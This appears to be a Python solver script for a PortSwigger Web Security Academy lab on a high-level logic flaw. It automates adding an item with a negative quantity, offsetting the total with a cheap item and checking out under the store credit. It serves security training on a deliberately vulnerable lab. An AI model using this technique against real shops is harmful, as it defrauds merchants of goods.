# Lab 02 — High-level logic vulnerability
# PortSwigger: https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-high-level
#
# Vulnerability: The cart accepts a negative quantity, which the server
#                multiplies by price without checking the sign of the
#                INDIVIDUAL line item — only the aggregate total is checked
# Aim:           Buy the "Lightweight l33t leather jacket" despite not
#                having enough store credit
#
# Technique:
#   Add the jacket with quantity=-1 (its line total goes negative).
#   Then add a second, cheap item with a large enough POSITIVE quantity
#   to bring the CART TOTAL back to a small positive number that's still
#   within your existing store credit — while the jacket remains in the cart.
#
# Usage: python business_logic_lab02.py <url> [cheap_product_id] [cheap_item_price]

import sys
import urllib3
from proxies import proxies
from business_logic_utils import (banner, section, make_session, login,
                                   find_product_id, add_to_cart, get_cart_total,
                                   check_status, print_box)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

JACKET_QUANTITY = "-1"


if __name__ == "__main__":
    banner()
    section("LAB 02 — HIGH-LEVEL LOGIC VULNERABILITY (NEGATIVE QUANTITY)")

    if len(sys.argv) < 2:
        print("  Usage: python business_logic_lab02.py <url> [cheap_product_id] [cheap_item_price]")
        sys.exit(1)

    url = sys.argv[1]
    cheap_product_id = sys.argv[2] if len(sys.argv) > 2 else None
    cheap_item_price = float(sys.argv[3]) if len(sys.argv) > 3 else 11.43

    session = make_session(proxies)
    if not login(session, url):
        sys.exit(1)

    print("\n  ── Step 1: add the jacket with a NEGATIVE quantity\n")
    jacket_id = find_product_id(session, url)
    r1 = add_to_cart(session, url, jacket_id, quantity=JACKET_QUANTITY)
    check_status(r1, [200, 302], f"Add jacket with quantity={JACKET_QUANTITY}")

    total_after_negative = get_cart_total(session, url)
    print_box("Cart total after negative-quantity jacket", f"${total_after_negative}")

    # ── Step 2: figure out a cheap item and enough quantity to offset ───────
    if not cheap_product_id:
        print("\n  ⚠  No cheap_product_id supplied — inspect the store manually")
        print("     for the cheapest available item, then re-run with:")
        print(f"     python business_logic_lab02.py {url} <cheap_id> <cheap_price>")
        sys.exit(0)

    print(f"\n  ── Step 2: add a cheap item (${cheap_item_price:.2f}) with enough")
    print(f"             positive quantity to bring the total positive again\n")

    # Rough estimate: figure out how many units are needed to counteract
    # the negative jacket total and land just under typical store credit ($100)
    try:
        jacket_negative_total = abs(float(total_after_negative.replace(",", "")))
    except (ValueError, AttributeError):
        jacket_negative_total = 1337.00  # fallback assumption

    target_positive = 90.00  # aim to land comfortably under $100 credit
    needed_quantity = int((jacket_negative_total + target_positive) / cheap_item_price)

    print(f"  ℹ  Estimated quantity needed: {needed_quantity}")

    r2 = add_to_cart(session, url, cheap_product_id, quantity=needed_quantity)
    check_status(r2, [200, 302], f"Add cheap item x{needed_quantity}")

    total_final = get_cart_total(session, url)
    print_box("Final cart total", f"${total_final}")

    print("\n  ── Step 3: place the order\n")
    r_checkout = session.post(f"{url}/cart/checkout")
    check_status(r_checkout, [200, 302], "Checkout")

    print()
    print("  ℹ  The server checks that the FINAL total isn't negative, but")
    print("     never validates that each individual line item's quantity")
    print("     is positive. If checkout fails, adjust the cheap item")
    print("     quantity manually to land the total within your credit.")
